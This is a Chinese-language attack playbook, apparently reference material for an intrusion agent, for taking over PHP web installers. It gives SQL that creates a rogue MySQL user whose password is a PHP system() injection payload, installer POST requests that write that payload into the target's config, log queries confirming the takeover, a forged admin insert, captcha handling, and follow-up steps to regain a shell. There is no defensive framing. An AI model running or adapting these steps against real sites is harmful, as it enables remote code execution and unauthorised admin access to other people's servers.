# 库重定向接管 — 可复制配方

## A. 跳板 MySQL 侧(假库 + payload 口令)

```sql
-- 用户必须 native,否则老 PHP 客户端(7.x)连 MySQL8 报 [2054]
CREATE USER 'wgpl'@'%' IDENTIFIED WITH mysql_native_password
  BY 'x'' . system($_GET[0] ?? '''') . ''x';      -- 口令 = payload(单引号在 SQL 里双写)
GRANT ALL PRIVILEGES ON *.* TO 'wgpl'@'%';        -- 安装器要建库/建表/导入
FLUSH PRIVILEGES;
```

本机自证(确认口令可用、且 `system` 空参求值 = `xx`):
```bash
mysql -h127.0.0.1 -uwgpl -p"x' . system(\$_GET[0] ?? '') . 'x" -e 'SELECT CURRENT_USER();'
```

**安装完成后把口令改成求值结果**,应用才连得上:
```sql
ALTER USER 'wgpl'@'%' IDENTIFIED BY 'xx';   -- 若 payload 求值不是 xx,换成对应固定串
```

> payload 求值规则: 目标文件里落地形态是 `'password' => <PAYLOAD>,` 或 `Env::get('database.password','<PAYLOAD>')`。
> 两种模板下 `x' . system(...) . 'x` 都合法;空参时 `system()` 返回空串 ⇒ 值 = `xx`。

## B. 安装器请求契约(以两步式为例)

1) 第 1 步(同时把凭据写进 session):
```
POST /install.php   (application/x-www-form-urlencoded)
host=<跳板IP>&username=wgpl&password=<payload>&database=<新库名>
&admin_username=<我们自填>&admin_password=<强口令>
```
- 很多实现另有一个**独立 AJAX oracle**:`POST /install.php?action=test_connection`(会真 `CREATE DATABASE`)。

2) 第 2 步(**必须同 cookie jar / 同 Session**):
```
POST /install.php?step=2
install_mode=fresh
```
- 判成功: 响应含「安装成功」/`install.lock` 可直接 GET 到/你的库中出现他们导入的表。

## C. 观测窗(你的验收器)

```sql
SELECT @@general_log, @@log_output;            -- TABLE 时看表,不看文件
SET GLOBAL general_log = ON;                   -- 必要时开
SELECT event_time, user_host, argument
  FROM mysql.general_log WHERE argument IS NOT NULL
 ORDER BY event_time DESC LIMIT 40;            -- 尾部取用,别全表 dump
```

**判读**:
- 出现目标站 IP 的 `user_host` + `SET NAMES utf8mb4` ⇒ 应用真连上来了(且能反推客户端类型)。
- 出现 `WHERE setting_key IN ('a','b',…)` ⇒ **直接抄键名**。
- 出现 `Access denied for user 'wgpl'@'<目标IP>'` ⇒ 配置已改写生效,但口令与用户当前口令不一致(通常是把口令从 payload 改成固定串的前后时点)。
- 一次全无 ⇒ 配置未生效(见 SKILL 步骤 4)。

## D. 伪造管理员

```sql
INSERT INTO admin (username, password, created_at)
VALUES ('adm_ops', '$2y$10$<bcrypt-60字符>', NOW());
-- 或直接用第 1 步表单里 admin_username/admin_password 自填的账号
```

登录判定与验证码节奏:
```
GET  /admin.php            -> 200 登录页
GET  /admin.php?captcha=<rand>  (同 session) -> 存图, 自己读图
POST /admin.php  username=..&password=..&captcha=<读出的4位>
  成功 = 302 (Location: admin.php) ; 失败 = 200 + 文案
```
验证码单次使用 ⇒ 读错必须**重新抓图再提交**,不要对同一张图重试。

## E. 验收清单(逐条,别跳)

1. 无害凭据 → oracle 返回成功;垃圾凭据 → 必须返回失败(证 oracle 不是 stub)。
2. step1+step2 同 session → 「安装成功」/lock 出现。
3. **你的**库里出现他们导入的表 ⇒ 安装器 SQL 已落我们手里。
4. 打一个会查库的端点 → general_log 出现该应用查询 ⇒ 配置**真生效**。
5. 用自建管理员登录后台 → 302 + 后台页字节数明显大于登录页。
6. 记基线 + 留好回滚值(原配置的主机/用户/口令/库名)。

## F. 无 shell 时的下一步

- 命令函数被禁 ⇒ 想重放安装器时必须先用**可控删文件**删掉 `install.lock`,再把 payload 换成写文件型函数。
- 数据面→shell 的完整面清单见 `db-control-to-shell-surface.md`。
